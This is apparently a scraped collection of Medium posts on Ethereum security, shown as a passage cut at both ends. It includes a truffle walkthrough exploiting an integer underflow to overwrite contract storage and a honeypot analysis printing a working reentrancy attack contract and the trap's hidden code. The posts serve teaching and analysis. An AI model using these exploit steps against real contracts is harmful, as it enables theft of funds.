say all \ud83d\ude02.\u2014Disclaimer: The views expressed by the author above do not necessarily represent the views of Consensys AG. ConsenSys is a decentralized community with ConsenSys Media being a platform for members to freely express their diverse ideas and perspectives.", "responses": 0, "tags": ["Ethereum", "Security", "Smart Contracts", "Digital Signatures", "Development"]}, {"title": "Manipulate Ethereum Storage By exploiting integer underflow vulnerability.", "post_link": "https://medium.com/@tagomaru/manipulate-ethereum-storage-by-exploiting-integer-underflow-vulnerability-c43f3b4fb73d?source=search_post", "author_name": "tagomaru", "author_link": "https://medium.com/@tagomaru", "publish_date": "2018-11-14", "last_modified_date": "2018-11-15", "readtime": "2.38", "claps": 25, "voters": 1, "content": "Manipulate Ethereum Storage By exploiting integer underflow vulnerability.tagomaruFollowNov 14, 2018 \u00b7 3 min readIn Ethereum space, there are some major vulnerablities such as Reentrancy, TOD, Timestamp dependence, and so on.On the other hand, smart contract has traditional vulnerability like integer overflow/underflow.The below new concet caught my eyes.Known Attacks - Ethereum Smart Contract Best PracticesEdit descriptionconsensys.github.ioThis is so interesting! This concept is one of integer underflow, but this results in manipulating storage which cannot be updated from exteral.I explain why this is vulnerable and how to exploit this contract since the above site does not explain how to exloit in detail. I think understainding exploiting is the best way to understand vulnerability.contract UnderflowManipulation {    address public owner;    uint256 public manipulateMe = 10;    function UnderflowManipulation() {        owner = msg.sender;    }    uint[] public bonusCodes;    function pushBonusCode(uint code) {        bonusCodes.push(code);    }    function popBonusCode()  {        require(bonusCodes.length >=0);  // this is a tautology        bonusCodes.length--; // an underflow can be caused here    }    function modifyBonusCode(uint index, uint update)  {         require(index < bonusCodes.length);        bonusCodes[index] = update; // write to any index less than bonusCodes.length    }}This is source code from the above link site.Anybody can call functions \u201cpushBonusCode, popBonusCode, and modifyBonusCode\u201d. manipulateMe cannot be updated.Demo1. deploy contract on truffle console2. Look into storage. (ufm is variable to define deployed contract)truffle(development)> web3.eth.getStorageAt(ufm.address,0)'0x000000000000000000000000b39056f52a9d5e04d98b171d49711f6ed4ae5f99'truffle(development)> web3.eth.getStorageAt(ufm.address,1)'0x000000000000000000000000000000000000000000000000000000000000000a'truffle(development)> web3.eth.getStorageAt(ufm.address,2)'0x0000000000000000000000000000000000000000000000000000000000000000'storage index#0 is assigned for owner state. index#1 is assigend for manipulateMe state3. push bonus code twicetruffle(development)> ufm.pushBonusCode.sendTransaction(0x100,{from:web3.eth.accounts[0],gas:5000000})'0x30e0724455efa74ad6cde1a1c478c913ceb323945fc5c44cf1dfd52b0a615137'truffle(development)> ufm.pushBonusCode.sendTransaction(0x100,{from:web3.eth.accounts[0],gas:5000000})'0x97ed0a4fad18013846f68b64ccd7ae547ad66897f318d0a11393a0106c8baac9'truffle(development)> web3.eth.getStorageAt(ufm.address,2)'0x0000000000000000000000000000000000000000000000000000000000000002'Looks OK. index#2 is assigned for bonusCodes.length.Where are values of bonusCodes? bonusCodes is dynamic array. You have to know how dynamic array values are stored on storage.4. Look into bonusCodes values.truffle(development)> web3.sha3(\"0x0000000000000000000000000000000000000000000000000000000000000002\", {encoding:\"hex\"})'0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace'truffle(development)> web3.eth.getStorageAt(ufm.address,\"0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace\")'0x0000000000000000000000000000000000000000000000000000000000000100'truffle(development)> web3.eth.getStorageAt(ufm.address,\"0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5acf\")'0x0000000000000000000000000000000000000000000000000000000000000100'web3.sha3 is to calculate sha3. At the first command, I caluculated sha3 for 0x2. Why 0x2? This 0x2 is storage index of bonusCodes. (Not bonusCodes.length). In Ethereum, dynamic array values store in index which starts from sha3 of storage index indicating dynamic array length. In fact, you can find the values \u201c0x100\u201d of bonusCodes on the indexes of \u201c0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace\u201d and \u201c0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5acf\u201d.Storage dump image is like below\u2026.Storage Dump5. Pop twicetruffle(development)> ufm.popBonusCode.sendTransaction({from:web3.eth.accounts[0],gas:5000000})'0xff3d651c01eb5bce51f6a3d7219c4eeef13d7d430e15b00bad1b905081c61629'truffle(development)>ufm.popBonusCode.sendTransaction({from:web3.eth.accounts[0],gas:5000000})'0x20e66b72b30ab91b4744468e567b00fca8b3289aee6a0e4c63f484043fbe2d2e'truffle(development)> web3.eth.getStorageAt(ufm.address,2)'0x0000000000000000000000000000000000000000000000000000000000000000'Here I poped twice to make bonusCodes empty.6. Underflowtruffle(development)> ufm.popBonusCode.sendTransaction({from:web3.eth.accounts[0],gas:5000000})'0x37e6f91d2d5037207ff6bac7499d120e6bb36c27df4e89e6be2a4aaf5fed47a0'truffle(development)> web3.eth.getStorageAt(ufm.address,2)'0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'Oops! By pop one more, underflow happend at bonusCodes.length!!!! Here, point is that we will be able to set huge value more than actual bonusCodes.length to modifyBonusCode function because \u201crequire(index < bonusCodes.length);\u201d is true thanks to underflow (\u201c0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\u201d)!. From here, I manipulate manipulateMe state.7. Calculate offset>>> hex(2 ** 256 - 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace + 1) '0xbfa87805ed57dc1f0d489ce33be4c4577d74ccde357eeeee058a32c55c44a533'This is on python3. I calculated offset from bonusCodes start index to manipulateMe. 2 ** 256 means max slot size of storage. \u201c0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace\u201d is offset from bonusCodes start index to max size. 1 is storage index for manipulateMe (It means offsef from index 0).8. Exploittruffle(development)> ufm.modifyBonusCode.sendTransaction(\"0xbfa87805ed57dc1f0d489ce33be4c4577d74ccde357eeeee058a32c55c44a533\", 0x777, {from:web3.eth.accounts[0],gas:5000000})'0x0675634a65036d9f008609b8acf743f50a0b18efea9890720a0dace74f4f76cf'truffle(development)> web3.eth.getStorageAt(ufm.address,1)'0x0000000000000000000000000000000000000000000000000000000000000777'Set the calculated offset on modifyBonusCode and sent transaction. Here overflow happens during calculating \u201c0xbfa87805ed57dc1f0d489ce33be4c4577d74ccde357eeeee058a32c55c44a533\u201d + \u201c0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace\u201d internally.I got it!!!I could manipulate manipulateMe which cannot be updated.", "responses": 0, "tags": ["Ethereum", "Smart Contract", "Blockchain", "Security", "Ctf"]}, {"title": "Puzzle", "post_link": "https://medium.com/@dao.challenge/puzzle-b33e89df7b86?source=search_post", "author_name": "DAO Challenge", "author_link": "https://medium.com/@dao.challenge", "publish_date": "2016-07-16", "last_modified_date": "2018-03-25", "readtime": "0.98", "claps": 0, "voters": 0, "content": "PuzzleDAO ChallengeFollowJul 16, 2016 \u00b7 1 min readEmin G\u00fcn Sirer \u2014 also known as @el33th4xor \u2014 posted a nice reentrancy puzzle on his blog: Reentrancy WoesHe explains why the contract in that blog post is vulnerable, but I still don\u2019t completely get it. This is good news for you, because it means I\u2019ll make plenty more mistakes. :-)His post is also the first place where I read what _ does in function modifiers:Here, the function is executed where it says _ and the check is run afterward.This is what confused me in the blog post:the invariant checks are performed in function modifiers, at function entry. So this particular stylistic pattern is treating a global invariant, which ought to hold at all times, as if it\u2019s just a pre-conditionIt seems to me that the invariant check happens at the end of a function and not at entry. Doesn\u2019t that make it a post-condition? I asked this in the comments:Update on July 19, 2016: G\u00fcn made a typo. That\u2019s one thing less I\u2019m confused about, but I\u2019m not there yet.Reentrancy Woes in Smart ContractsSmart contracts are pretty difficult to get right. This should come as no surprise. We knew that programming in general\u2026disq.us", "responses": 1, "tags": ["Ethereum", "Solidity"]}, {"title": "Vulnerability Is Found in Constantinople Hours After ETH Devs Call It \u2018Least Eventful\u2019 Hard Fork", "post_link": "https://medium.com/@allsparkchain/vulnerability-is-found-in-constantinople-hours-after-eth-devs-call-it-least-eventful-hard-fork-45aa953471c9?source=search_post", "author_name": "allsparkchain", "author_link": "https://medium.com/@allsparkchain", "publish_date": "2019-01-16", "last_modified_date": "2019-01-16", "readtime": "2.28", "claps": 0, "voters": 0, "content": "Vulnerability Is Found in Constantinople Hours After ETH Devs Call It \u2018Least Eventful\u2019 Hard ForkallsparkchainFollowJan 16 \u00b7 3 min readEthereum\u2019s (ETH) Constantinople hard fork faces a delay over a newly discovered security vulnerability allowing a reentrancy attack. The critical issue was detected by smart contract audit firm ChainSecurity and reported in a blog post Jan. 15.According to the company\u2019s report, the Constantinople upgrade introduces cheaper gas cost (transaction fees) for some operations on the Ethereum network. As an unexpected side effect, this allegedly enables reentrancy attacks via the use of certain commands in ETH smart contracts.A reentrancy vulnerability allows a potential attacker to steal cryptocurrency from a smart contract on the network by repeatedly requesting funds from it while feeding it false data about the malicious actor\u2019s actual ETH balance.Afri Schoedon, the hard fork coordinator at Ethereum and release manager at blockchain infrastructure provider Parity Technologies, has confirmed on Reddit that the core developers of Ethereum are aware of the vulnerability.Schoedon explained that an all-core-dev call has been scheduled on Friday, Jan. 18, to decide on further steps in relation to the newly discovered loophole. According to him, the launch of Constantinople has been postponed until at least the next week:\u201cWe will decided (sic) further steps on Friday in the all-core-devs call. For now it will not happen this week. Stay tuned for instructions.\u201dOn the same day that the vulnerability was discovered, Ethereum\u2019s core developers said that they expect the upcoming fork to be the least eventful one in the history of Ethereum. Their remarks were reported in a Bloomberg article published Jan. 15.Constantinople was first trialed on the Ethereum public testnet Ropsten in mid October last year, and had been intended to be swiftly activated on the main blockchain by the end of October\u2013November 2018.After facing technical hurdles, its launch was delayed to be implemented at Ethereum block 7,080,000, expected Jan. 16. Given the fork\u2019s focus on primarily technical improvements, Ethereum core dev Lane Rettig told Bloomberg:\u201cI really can\u2019t imagine a less contentious hard fork, to be honest. Of all the hard forks in the history of Ethereum, it\u2019s probably the least eventful one.\u201dAs reported, in earlier discussions of Constantinople, some devs had proposed it would be less controversial, or even political, to change the term for the transition from hard fork to \u201cupdate.\u201dThe main impact of the shift will be the reduction of mining rewards for each block from the current 3 ETH to 2. The downward adjustment could reportedly help to reduce the inflation and volatility that is allegedly associated with miners selling ETH to cover their costs and boost revenue.If reduced incentives equate to less support from miners, as Bloomberg notes, this could render the network more susceptible to the possibility of a 51 percent attack \u2014 a risk that has been robustly demonstrated in the recent attack on Ethereum Classic (ETC).Yet, as reported, the reduction is unlikely to be controversial, as it has long been in the works to gradually reduce rewards to zero as the network readies for its planned transition to a Proof-of-Stake (PoS) consensus algorithm.The high stakes involved in implementing hard forks were thrown into stark relief last November, when the Bitcoin Cash (BCH) community splintered into two warring factions over a scheduled hard fork.Major United States cryptocurrency exchanges Coinbase and Kraken are the latest to have confirmed their support for Constantinople, joining other top global industry players such as Binance, Huobi and OKEx. Kraken has aligned with the devs in saying it expected the fork would not be controversial.", "responses": 0, "tags": ["Blockchain"]}, {"title": "", "post_link": "https://medium.com/@aliashraf.davarpanah_68877/oh-come-on-who-are-we-kidding-e13dc2b1805a?source=search_post", "author_name": "Ali Ashraf Davarpanah", "author_link": "https://medium.com/@aliashraf.davarpanah_68877", "publish_date": "2019-01-18", "last_modified_date": "2019-01-18", "readtime": "0.36", "claps": 0, "voters": 0, "content": "How the Constantinople delay shows how decentralized Ethereum is.1211Joseph SchiarizziAli Ashraf DavarpanahFollowJan 18 \u00b7 1 min readOh, come on. Who are we kidding?Ethereum is not properly governed and it couldn\u2019t. Basic idea, Turing completeness, is the true reason. Looking closer to this reentrancy bug reveals something weird: it is not a bug! It is inherent to basic idea behind smart contracts being supporting loops/recursion. It was under control because of gas consumption rate and once they reduced it in Constantinople it came back.It is the decidability problem, people can decide about the code because it is complicated and unpredictable, developer\u2019s can\u2019t improve the code because it yields unpredictable side effects.", "responses": 0, "tags": []}, {"title": "", "post_link": "https://medium.com/@logol/hey-moritz-and-all-for-that-matter-773998f4479e?source=search_post", "author_name": "Logan Ryan Golema", "author_link": "https://medium.com/@logol", "publish_date": "2018-05-07", "last_modified_date": "2018-05-07", "readtime": "0.19", "claps": 0, "voters": 0, "content": "How to issue your own token on Ethereum in less than 20 minutes.20K268Moritz NetoLogan Ryan GolemaFollowMay 7, 2018 \u00b7 1 min readHey Moritz, and all for that mattertheres a bit of an old vulnerability in the contractthe fallback allows for king of the eth reentrancy attacks and also makes it impossible to send ethers to the contract without declaring which functionfunction () public payable{revert;}just a helpful tip", "responses": 0, "tags": []}, {"title": "", "post_link": "https://medium.com/@robmagier/hi-gus-thatt-s-a-good-one-what-would-be-the-solution-for-it-3885fd4baa68?source=search_post", "author_name": "Rob Magier", "author_link": "https://medium.com/@robmagier", "publish_date": "2018-03-19", "last_modified_date": "2018-03-19", "readtime": "0.36", "claps": 0, "voters": 0, "content": "Reentrancy Attack On Smart Contracts: How To Identify The Exploitable And An Example Of An Attack\u20261.2K9Gustavo (Gus) GuimaraesRob MagierFollowMar 19, 2018 \u00b7 1 min readHi Gus, That\u2019t s a good one. What would be the solution for it ?Does it this code fix the problem.We change this original code from this:function get() {    if (!msg.sender.call.value(balances[msg.sender])()) {      throw;    }      balances[msg.sender] = 0;  }to this:function get() {     uint tmpbalance = balances[msg.sender];     if (balances[msg.sender] == 0 )      {        throw;     }     balances[msg.sender] = 0;    if (!msg.sender.call.value(tmpbalance)()) {      //no need to revert balances[msg.sender] to tmpbalance      // because we throw.      throw;    }  }But i guess this is better:modifier nonReentrant() { require(!reentrancy_lock); reentrancy_lock = true; _; reentrancy_lock = false; }", "responses": 1, "tags": ["Reentrancy", "Solidity", "Solution", "Proposal"]}, {"title": "", "post_link": "https://medium.com/@jrcm_/recome%C3%A7os-c3801c416365?source=search_post", "author_name": "julia tert\u00falia", "author_link": "https://medium.com/@jrcm_", "publish_date": "2018-01-25", "last_modified_date": "2018-02-23", "readtime": "0.65", "claps": 11, "voters": 4, "content": "julia tert\u00faliaFollowJan 25, 2018 \u00b7 1 min readRecome\u00e7os,Reentr\u00e2ncias eReviravoltasVoltas refeitas e desfeitas, repeti\u00e7\u00f5es intermin\u00e1veisMais do mesmo ciclo vicioso, tentativa de fuga mal-sucedidaPor que sempre caio de volta no mesmo buraco?A aprendizagem me escapa, perco o fio da meadaE quando se esvai a for\u00e7a de vontade, me esque\u00e7o dos erros e fa\u00e7o tudo outra vezQue nem uma garotinha boba, que cai sempre na mesma pegadinha daquele menino pentelha que insiste em ficar por l\u00e1Me vejo perdida, e n\u00e3o sei mais em que ponto da evolu\u00e7\u00e3o me encontravaT\u00e3o absorta em meus devaneios que esque\u00e7o todo o progressoE acabo repetindo as mesmas palavras, pulando as mesmas letras, trocando as mesmas s\u00edlabasAcabando com a mesma frase sem sentido", "responses": 0, "tags": ["Poema", "Mulheres Na Literatura", "Poesia Brasileira", "Leia Mulheres", "Poesia"]}, {"title": "Smart Contract Honeypot: Private_Bank", "post_link": "https://medium.com/@zhongqiangc/smart-contract-honeypot-private-bank-536b7cd6051c?source=search_post", "author_name": "Zhongqiang Chen", "author_link": "https://medium.com/@zhongqiangc", "publish_date": "2019-08-27", "last_modified_date": "2019-09-03", "readtime": "11.3", "claps": 0, "voters": 0, "content": "Smart Contract Honeypot: Private_BankZhongqiang ChenFollowAug 27 \u00b7 12 min readOverview of smart contract Private_bankEthereum blockchain enables the execution of smart contracts to process transactions and interact with other smart contracts across a decentralized network of nodes. Along with the increasing popularity of smart contracts and valuable digital value they carry, the attacks against smart contract also become wide spread. Among those attacks, one type of attacks is quite unique because it does not attempt to search for vulnerabilities in other contracts, instead, it tries to lure its victims into traps by deploying seemingly vulnerable contracts that contain hidden traps.This type of attacks is known as smart contract honeypots. The private_bank contract is one of such honeypots, which provides mechanism for its users to deposit and cash out Ethers. The function to cash out money, however, contains an obvious reentrance vulnerability that can be exploited by hackers.This easily spotted reentrance vulnerability turns out to be a trap that lures its victims to hack this contract because the hackers need to deposit money to the contract before they can exploit the vulnerability.To further convince hackers that the vulnerability they spot is indeed exploitable, the honeypot creator also makes the source code of the contract available to the public. The source code of the smart contract, private_bank, is copied here./** *Submitted for verification at Etherscan.io on 2018-02-09*/pragma solidity ^0.4.19;contract Private_Bank{    mapping (address => uint) public balances;    uint public MinDeposit = 1 ether;    Log TransferLog;    function Private_Bank(address _log)    {        TransferLog = Log(_log);    }    function Deposit()    public    payable    {        if(msg.value >= MinDeposit)        {            balances[msg.sender]+=msg.value;            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");        }    }    function CashOut(uint _am)    {        if(_am<=balances[msg.sender])        {            if(msg.sender.call.value(_am)())            {                balances[msg.sender]-=_am;                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");            }        }    }    function() public payable{}}contract Log{    struct Message    {        address Sender;        string  Data;        uint Val;        uint  Time;    }    Message[] public History;    Message LastMsg;    function AddMessage(address _adr,uint _val,string _data)    public    {        LastMsg.Sender = _adr;        LastMsg.Time = now;        LastMsg.Val = _val;        LastMsg.Data = _data;        History.push(LastMsg);    }}The private_bank contract uses another contract named \u201cLog\u201d to record all transactions (i.e., messages) submitted to the contract. So, the source code of the Log contract is also provided along with that of private_bank contract. The address of the \u201cLog\u201d contract will be the parameter to the constructor of the private_bank contract when the latter is deployed.Here is the information of the deployed private_bank contract and its log contract.address of the private_bank contract:0x95d34980095380851902ccd9a1fb4c813c2cb639creator of the private_bank contract:0x3476E2628006a7f74285C44b501437B415B08299address of the log contract:0xF8681Dad1cE4f1f414FB07FC07f81a3A82E91D8fcreator of the log contract:0x78737Ca0804983600C477257Cfc37A0D7Ec4d009Evidently, the creators of the private_bank contract and the log contract are not the same, implying that the honeypot creator in fact controls more than one addresses.By analyzing the function CashOut() of the private_bank contract, we can notice that the function first sends funds to the caller and only after that changes its own status (that is, updating the balance of the sender). That is obviously vulnerable to reentrancy attack.A hacker\u2019s storySuch a reentrancy vulnerability is, of course, easily spotted by any hackers. One hacker decided to exploit this vulnerability.To exploit reentrancy vulnerability, the hacker created a smart contract and tested it thoroughly in a test net. After verifying that the code is effective, the hacker deployed the smart contract on the Ethereum main net. The address of the smart contract is as follows.The address of the hacker's contract:0x6f49BAEF279f8c40D7479f5Be6a9bBF5fc607af0The hacker's address:0xE0B4789D1cb42F0eE149BfbC12f016Dbd55Db33BThe story told by the hacker can be found at:https://www.reddit.com/r/ethdev/comments/7x5rwr/tricked_by_a_honeypot_contract_or_beaten_by/By using reverse engineering techniques, we can recover the source code of the hacker\u2019s contract, which looks like the following.pragma solidity ^0.5.1;contract contract_6f49 {    address constant privateBank = 0x95D34980095380851902ccd9A1Fb4C813C2cb639;    // hash:    // 0x3984f38ce2c135261f712a8230a55882580d7ec5b607ae7001cac18690209cc1    event Exploit(address index, uint256);    // hash:    // 0x69f1113d0aca8d327041b799b546b8f10772b73b3d974e6c93ec95842b19b274    event Reentrance(address index, uint256);    // slot 0x00    address payable owner;    // slot 0x01    address bank;    constructor() public {        bank = privateBank;        owner = msg.sender;    }    // function selector: 0x41c0e1b5    // code entrance: 0x01ef    function kill() public {        if (msg.sender == owner) {            selfdestruct(owner);        }    }    // function selector: 0xb29f0835    // code entrance: 0x0204    // note: function digest does not match    function exploit() public payable {        emit Exploit(msg.sender, address(this).balance);        // function Deposit() digest: 0xed21248c        (bool success,) = bank.call.value(msg.value)(            abi.encodeWithSelector(0xed21248c));        if (!success) {            revert();        }        // function CashOut() digest: 9ffa0711        (success,) = bank.call(abi.encodeWithSelector(0x9ffa0711,            msg.value));        if (!success) {            revert();        }    }    // function selector: 0xf2a75fe4    // code entrance: 0x020e    function empty() public {        if (msg.sender == owner) {            msg.sender.transfer(address(this).balance);        }    }    // code entrance: 0x0057    function () external payable {        emit Reentrance(bank, bank.balance);        if (msg.value <= bank.balance) {            // function CashOut() digest: 9ffa0711            (bool success,) = bank.call(abi.encodeWithSelector(                0x9ffa0711, msg.value));            if (!success) {                revert();            }        }    }}Clearly, the reentrancy attack launched by the hacker is simply the standardized routine: after triggering the attack, the fallback function is used to repeatedly call back into the vulnerable contract until the fund of the latter is drained.One minor issue of the hack is: although the code checks the balance of the vulnerable contract before reentries, but it does not control the depth of the reentrance. If the funds in the vulnerable contract is huge and gas is used up before the funds are drained, the exploit will fail.Anyway, as the balance in the vulnerable contract is small, the hack should be effective. Therefore, the hacker launched the attack by sending the following transaction to his hack contract.Transaction Hash:0xed5eaf959224dff10fb705e16af81017374f3f3856ada926571aa9f8ef8e0b63Status: SuccessBlock: 5079425 3348609 Block ConfirmationsTimestamp: 559 days 21 hrs ago (Feb-12-2018 10:47:32 PM +UTC)From: 0xe0b4789d1cb42f0ee149bfbc12f016dbd55db33bTo: Contract 0x6f49baef279f8c40d7479f5be6a9bbf5fc607af0TRANSFER  1 Ether From 0x6f49baef279f8c40d7479f5be6a9bbf5fc607af0 To  0x95d34980095380851902ccd9a1fb4c813c2cb639Value: 1 Ether ($187.22)Transaction Fee: 0.00316286 Ether ($0.59)Gas Limit: 600,000Gas Used by Transaction: 316,286 (52.71%)Gas Price: 0.00000001 Ether (10 Gwei)Nonce Position 5 17Input Data: 0xb29f0835This transaction triggers the function with selector 0xb29f0835, which is function exploit() in the smart contract, and carries 1 Ether. When the function is successfully executed, it will first calls function Deposit() of the target contract and then invokes function CashOut() to pull funds. The entire process can be clearly demonstrated by the following internal transactions by the attack.The Contract Call From 0xe0b4789d1cb42f0ee149bfbc12f016dbd55db33b To 0x6f49baef279f8c40d7479f5be6a9bbf5fc607af0 Produced 3 Contract Internal Transactions :Type Trace Address      From            To      Value   Gas Limitcall_0  0x6f49baef279f8c40d7479f5be6a9bbf5fc607af0               0x95d34980095380851902ccd9a1fb4c813c2cb639     1 Ether 559,457call_1_0       0x95d34980095380851902ccd9a1fb4c813c2cb639              0x6f49baef279f8c40d7479f5be6a9bbf5fc607af0      1 Ether 389,919call_1_0_0_0        0x95d34980095380851902ccd9a1fb4c813c2cb639              0x6f49baef279f8c40d7479f5be6a9bbf5fc607af0      1 Ether 346,112Here, transaction call_0 is created by the Deposit() operation, while transaction call_1_0 is created by the CashOut() operation and call_1_0_0_0 is the result of the reentrance.Based on the information shown above, the attack looks to be successful, and the hacker should get 2 Ethers in the pocket by only depositing 1 Ether.But the result surprised the hacker because the money deposited was locked in the target\u2019s contract.The much even bigger surprise happened shortly after the hacker\u2019s attack: all the fund in the target contract (i.e., private_bank) was drained by the following transaction, let\u2019s call it transaction 9d19.Transaction Hash: 0x9d19c476aba9eaae6628d8619b122d85a294ff47d9486a765e64a6488db599a0Status: SuccessBlock: 5079597 3348490 Block ConfirmationsTimestamp: 559 days 21 hrs ago (Feb-12-2018 11:28:10 PM +UTC)From: 0x6b35c9f9670c0641e3d5e80642992223d1ffec7bTo: Contract 0xabb4b9b48ceaefc290464025bdd4ef324f8b23c4TRANSFER  1.0001 Ether From 0xabb4b9b48ceaefc290464025bdd4ef324f8b23c4 To  0x95d34980095380851902ccd9a1fb4c813c2cb639Value: 0 Ether ($0.00)Transaction Fee: 0.000247256 Ether ($0.05)Gas Limit: 175,745Gas Used by Transaction: 123,628 (70.35%)Gas Price: 0.000000002 Ether (2 Gwei)Nonce Position 6 58Input Data: 0x1190a88a0000000000000000000000000000000000000000000000000de111a6b7de4000Again, transaction 9d19 further generates some other internal transactions.The Contract Call From 0x6b35c9f9670c0641e3d5e80642992223d1ffec7b To 0xabb4b9b48ceaefc290464025bdd4ef324f8b23c4 Produced 4 Contract Internal Transactions :Type Trace Address      From            To      Value   Gas Limitcall_0  0xabb4b9b48ceaefc290464025bdd4ef324f8b23c4               0x95d34980095380851902ccd9a1fb4c813c2cb639     1.0001 Ether    114,924call_1_0       0x95d34980095380851902ccd9a1fb4c813c2cb639              0xabb4b9b48ceaefc290464025bdd4ef324f8b23c4      1.0001 Ether    52,051call_1_0_0_0        0x95d34980095380851902ccd9a1fb4c813c2cb639              0xabb4b9b48ceaefc290464025bdd4ef324f8b23c4      1 wei   12,089call_2_0       0x95d34980095380851902ccd9a1fb4c813c2cb639              0xabb4b9b48ceaefc290464025bdd4ef324f8b23c4      2.400000346762534399 Ether      10,990If we compare the internal transactions of this transaction with those of the hacker\u2019s transaction, we can see the similarity: both call Deposit() first and then invoke CashOut(). However, they also look differences: the hacker calls CashOut() only once, but the transaction 9d19 makes two calls to CashOut(): call_1 and call_2. Also, the first call to CashOut() obviously causes reentries because it triggers two internal transactions: call_1_0 and call_1_0_0_0, in contrast, the second call to CashOut() has no reentrance.Let\u2019s see what happened.The strategy of the honeypot creatorAs pointed out before, the private_bank contract utilizes another contract named \u201cLog\u201d to record all messages submitted to it. Although the source code of the Log contract is also made available along with that of private_bank contract, the source code provided for the Log contract, however, only acts as an interface to the private_bank contract. So, when compiling the code for prviate_bank contract, the only information about the Log contract it uses is the signatures of the interface, not their implementation.In other words, the Log contract is free to implement any logic it wants per standard Object Oriented inheritance as long as it sticks to the same interface expected by its callers. That is similar to ERC20 interface: all contracts for ERC20 tokens follow the same standardized interface, but their implementations can be different based on their purposes.From the deployment of the private_bank contract, we know that its Log contract is at 0xF8681Dad1cE4f1f414FB07FC07f81a3A82E91D8f. Resorting to reverse engineering tricks, we can recovery its source code as follows.pragma solidity ^0.5.1;contract contract_f868 {    address constant buddy = 0x38Dc7c63c32c1e919D03F81D7e5b7e3CD3196E2d;    struct Message {        address Sender;        string  Data;        uint    Val;        uint    Time;    }    // slot 0x00    // getter function selector: 0x89977cdf    // getter function digest does not match    address public owner;    // slot 0x01    // getter function selector: 0xf85f97dd    // getter function digest does not match    address public ownerNext;    // slot 0x02    // getter function selector: 0xedbbdf2e    // getter function digest does not match    mapping (address => bool) public buddyPool;    // slot 0x03    // getter function selector: 0x930339be    // getter function digest does not match    mapping (address => bool) public cashoutPool;    // slot 0x04    // getter function selector: 0xa21f0368    Message[] public History;    // slot 0x05    Message LastMsg;    modifier onlyOwner() {        require(msg.sender == owner);        _;    }    constructor() public {        owner = msg.sender;        buddyPool[buddy] = true;    }    // function selector: 0x2fac8979    // code entrance: 00c7    // note: function digest does not match    function promoteOwner() public {        if (msg.sender == ownerNext) {            owner = ownerNext;        }    }    // function selector: 0x474dacce    // code entrance: 00dc    // note: function digest does not match    function setCashOutStatus(address _addr, bool _flag) public {        require((msg.sender == owner) &&            (buddyPool[msg.sender] == true));                cashoutPool[_addr] = _flag;    }    // function selector: 0x4b906714    // code entrance: 0120    // note: function digest does not match    function runCall(address _addr, uint256 _value,         bytes memory _data)        public payable onlyOwner {        (bool success,) = _addr.call.value(_value)(            abi.encode(_data));        if(!success) {            revert();        }    }    // function selector: 4c2f04a49    // code entrance: 019a    function AddMessage(address _adr, uint _val, string memory _data)        public {        if (!cashoutPool[_adr]) {            LastMsg.Sender = _adr;            LastMsg.Time = block.timestamp;            LastMsg.Val = _val;            LastMsg.Data = _data;            History.push(LastMsg);            assert(bytes(_data).length > 0);            if ((bytes(_data)[0] == 'C') && (_val > 0)) {                revert();            }        }    }    // function selector: 0x9003e39a    // code entrance: 0274    // note: function digest does not match    function runDelegateCall(address _addr, bytes memory _data)        public payable onlyOwner {        (bool success,) = _addr.delegatecall(abi.encode(_data));        if (!success) {            revert();        }    }    // function selector: 0x90a68455    // code entrance: 02e5    // note: function digest does not match    function setNextOwner(address _addr) public onlyOwner {        ownerNext = _addr;    }    // function selector: 0xbe9474bb    // code entrance: 0469    // note: function digest does not match    function setBuddyStatus(address _addr, bool _flag) public onlyOwner {        buddyPool[_addr] = _flag;    }    // function selector: 0xc144811f    // code entrance: 04ad    // note: function digest does not match    function withdraw() public payable onlyOwner {        msg.sender.transfer(address(this).balance);    }}It can be seen that the deployed Log contract is much richer in functionality than that provided to the public by the honeypot creator. Recording messages submitted to the private_bank contract is only one of its features. The Log contract also maintains a buddy pool that specifies who are the buddies of the ecosystem and therefore are immune to honeypot baits. Those trusted buddies can further grant permission to their friends for cashing out.As the private_bank contract invokes function AddMessage() of the Log contract, let\u2019s compare its code provided by the honeypot creator and that actually deployed. First, in the deployed Log contract, a condition is added to determine whether or not the message should be recorded. The message is kept only if the message sender is not in the cashout pool. Next, when a message was recorded, the function further checks whether the message is for Deposit or CashOut. If it is for CashOut, the function will revert if the cashout value is positive.One interesting point is that: the function does not compare the whole string (argument 3) provided by the caller, instead, it only checks the first letter and it reverts the transaction if the highest byte of the string is \u201cC\u201d. It turns out that the same Log contract is used by its creator to control multiple honeypots such as private_bank, private_deposit, and coin_box. In coin_box contract, the function equivalent to CashOut() of private_bank and private_deposit contracts is Collect(), and both functions happen to start with \u201cC\u201d.From transaction 9d19 described above, we also know that the honeypot creator did not interact directly with the Log contract, instead, the creator used another contract located at 0xabb4b9b48ceaefc290464025bdd4ef324f8b23c4 as the launch pad.address of the contract:0xabb4b9b48ceaefc290464025bdd4ef324f8b23c4creator of the contract:0x6b35C9f9670C0641e3d5e80642992223D1FFec7bThe source code of this contract, let\u2019s call it contract abb4, restored by reverse engineering, looks as follows.pragma solidity ^0.5.1;contract contract_abb4 {    // slot 0x00    // getter function selector: 0x89977cdf    address public owner;    // slot 0x01    // getter function selector: 0xf85f97dd    address public ownerNext;    // slot 0x02    // getter function selector: 0xedbbdf2e    mapping (address => bool) public buddyPool;    // slot 0x03    // getter function selector: 0x4fe6f55f    address public bank;    // getter function selector: 0xeb5c3a36    bool public doExploit;    modifier onlyOwner() {        require(msg.sender == owner);        _;    }    constructor() public {        owner = msg.sender;    }    function() external payable {        if (doExploit == true) {            doExploit = false;            bank.call(abi.encodeWithSignature(\"CashOut(uint256)\", 1));        }    }    // function selector: 0x1190a88a    // code entrance: 01e2    function clearBank(uint256 _val) public payable onlyOwner {        uint256 oldBalance = 